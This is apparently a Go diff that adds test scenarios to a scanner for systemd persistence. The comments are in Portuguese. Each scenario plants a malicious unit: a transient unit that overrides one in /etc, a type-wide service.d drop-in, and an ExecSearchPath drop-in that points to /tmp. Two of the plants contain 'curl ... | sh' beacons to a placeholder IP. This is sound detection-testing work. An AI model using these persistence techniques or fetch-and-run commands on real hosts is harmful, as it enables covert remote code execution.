@@ -109,3 +109,69 @@ func init() {
 		Exit:           1,
 	})
 }
+
+func init() {
+	// P0 desta rodada, virado cenário: a precedência REAL do systemd. A unit
+	// efêmera em /run/systemd/transient VENCE a de /etc/systemd/system de mesmo
+	// nome. O implante põe o beacon (curl|sh) na transient e uma benigna em /etc.
+	// Antes do conserto, a de /etc era marcada efetiva e a transient Shadowed —
+	// o check de execução pulava o beacon (FN da unit ATIVA). Prova contra o
+	// systemd de verdade, não contra a leitura do man page.
+	Register(Scenario{
+		ID:     "J4-transient-vence-etc",
+		Desc:   "unit efêmera em /run/systemd/transient VENCE a de /etc de mesmo nome",
+		Images: servicos,
+		Plant: `mkdir -p /run/systemd/transient /etc/systemd/system
+			printf '[Service]\nExecStart=/bin/true\n' > /etc/systemd/system/telemetry.service
+			printf '[Service]\nExecStart=/bin/sh -c "curl -s http://198.51.100.9/p | sh"\n' > /run/systemd/transient/telemetry.service`,
+		Expect: []Expect{
+			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "telemetry.service"},
+		},
+		Exit: 2,
+	})
+}
+
+func init() {
+	// #8 desta rodada, virado cenário: drop-in TYPE-WIDE. Um `service.d/` (sem
+	// nome de unit) altera TODA .service — ssh, cron, rsyslog, todas as do
+	// pacote. O implante põe um ExecStartPre que baixa e executa. Antes do
+	// conserto, só o drop-in de NOME exato entrava, e o type-wide não afetava
+	// unit nenhuma: FN. A imagem tem serviços de VERDADE para o padrão casar.
+	Register(Scenario{
+		ID:     "J5-dropin-type-wide",
+		Desc:   "service.d/ (type-wide) com ExecStartPre malicioso atinge toda service",
+		Images: servicos,
+		Plant: `mkdir -p /etc/systemd/system/service.d
+			printf '[Service]\nExecStartPre=/bin/sh -c "curl -s http://198.51.100.9/t | sh"\n' > /etc/systemd/system/service.d/50-global.conf`,
+		Expect: []Expect{
+			// Subject de uma service REAL: sem a expansão o achado sairia só
+			// sobre o padrão "service", não sobre ssh.service. Exigir a service
+			// concreta é o que prova que o type-wide alcançou a base.
+			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "ssh.service"},
+		},
+		Exit: 2,
+	})
+}
+
+func init() {
+	// #4 desta rodada, virado cenário: o ExecSearchPath de um DROP-IN resolve o
+	// ExecStart de nome-nu da BASE. A base tem `ExecStart=payload` (nome nu, sem
+	// searchpath próprio); o drop-in acrescenta ExecSearchPath=/tmp/.cache, e o
+	// systemd roda /tmp/.cache/payload. Antes do conserto a base não via o
+	// searchpath do drop-in, "payload" ficava nome nu (não-caminho) e o check de
+	// execução não classificava nada — FN do bypass.
+	Register(Scenario{
+		ID:     "J6-execsearchpath-dropin",
+		Desc:   "ExecSearchPath de drop-in resolve o ExecStart nu da base para /tmp",
+		Images: servicos,
+		Plant: `mkdir -p /etc/systemd/system/beacon.service.d /tmp/.cache
+			printf '[Service]\nExecStart=payload --daemon\n' > /etc/systemd/system/beacon.service
+			printf '[Service]\nExecSearchPath=/tmp/.cache\n' > /etc/systemd/system/beacon.service.d/10-path.conf
+			printf '#!/bin/sh\nexit 0\n' > /tmp/.cache/payload
+			chmod +x /tmp/.cache/payload`,
+		Expect: []Expect{
+			{ID: "persist.unit_exec_suspect", Sev: "CRITICAL", Subject: "beacon.service", Evidence: "/tmp/.cache/payload"},
+		},
+		Exit: 2,
+	})
+}
